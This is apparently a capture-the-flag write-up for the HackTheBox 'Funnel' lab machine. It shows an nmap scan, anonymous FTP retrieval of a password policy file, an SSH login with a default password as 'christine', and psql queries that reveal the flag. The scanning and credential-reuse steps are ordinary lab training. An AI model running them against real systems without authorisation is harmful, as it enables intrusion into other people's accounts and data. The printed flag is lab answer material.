# [HackTheBox] [Funnel]: [Enumeration], [Foothold]

**Target:** [Funnel] | **OS:** Linux | **Difficulty:** Super Easy  
**Attack Vector:** [Enumeration -> Foothold]

---

## 1. Enumeration

```bash
sudo nmap -p- -sS --min-rate 5000 -T3 10.129.228.195
```

`PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh`

```shell
➜ sudo nmap -p21,22- -sV -sC 10.129.228.195
Starting Nmap 7.993 ( https://nmap.org ) at 2026-11-19 16:25 +0100
Nmap scan report for 10.129.228.195
Host is up (0.039s latency).
Not shown: 65513 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.15.68
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.02 seconds
```

In this scan we can see port 21 is susceptible to anon login so lets continue with that

```shell
➜ ftp 10.129.228.195
Connected to 10.129.228.195.
220 (vsFTPd 3.0.3)
Name (10.129.228.195:yoel): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
226 Directory send OK.
ftp> cd mail_backup
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
-rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
226 Directory send OK.
ftp> get password_policy.pdf
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for password_policy.pdf (58899 bytes).
226 Transfer complete.
58899 bytes received in 0.0998 seconds (576.5508 kbytes/s)
ftp> get welcome_28112022
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for welcome_28112022 (713 bytes).
226 Transfer complete.
713 bytes received in 0.0035 seconds (198.5894 kbytes/s)
ftp> bye
221 Goodbye.
```

After checking both files we can try loggin in with the default password on ssh

## 2. Foothold

```shell
➜ ssh albert@10.129.228.195
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
albert@10.129.228.195's password: 
Permission denied, please try again.
albert@10.129.228.195's password: 
➜ ssh christine@10.129.228.195
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
christine@10.129.228.195's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 19 Nov 2026 03:36:24 PM UTC

  System load:              0.0
  Usage of /:               61.4% of 4.78GB
  Memory usage:             12%
  Swap usage:               0%
  Processes:                158
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for ens160:  10.129.228.195
  IPv6 address for ens160:  dead:beef::a0de:adff:fecf:f05f

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
```

Here we logged in after 2 attempts 

```shell
ss -tl 
```

We can see it uses `postgresql`

```shell
psql -h 127.0.0.1 -U christine
christine-# \l
                                                      List of database
s
   Name    |   Owner   | Encoding | Locale Provider |  Collate   |   C
type    | Locale | ICU Rules |    Access privileges    
-----------+-----------+----------+-----------------+------------+----
--------+--------+-----------+-------------------------
 christine | christine | UTF8     | libc            | en_US.utf8 | en_
US.utf8 |        |           | 
 postgres  | christine | UTF8     | libc            | en_US.utf8 | en_
US.utf8 |        |           | 
 secrets   | christine | UTF8     | libc            | en_US.utf8 | en_
US.utf8 |        |           | 
 template0 | christine | UTF8     | libc            | en_US.utf8 | en_
US.utf8 |        |           | =c/christine           +
           |           |          |                 |            |    
        |        |           | christine=CTc/christine
 template1 | christine | UTF8     | libc            | en_US.utf8 | en_
US.utf8 |        |           | =c/christine           +
           |           |          |                 |            |    
        |        |           | christine=CTc/christine
(5 rows)

christine-# 
```

Here i saw `secrets` so lets dive in


## 3. Flag

```shell
christine-# \c secrets
psql (18.7, server 15.1 (Debian 15.1-1.pgdg110+1))
You are now connected to database "secrets" as user "christine".
secrets-# \dt
          List of tables
 Schema | Name | Type  |   Owner   
--------+------+-------+-----------
 public | flag | table | christine
(1 row)

secrets=# SELECT * FROM flag;
              value               
----------------------------------
 cf277664b1771217d7006acdea006db1
(1 row)

secrets=# 
```

Pwned.
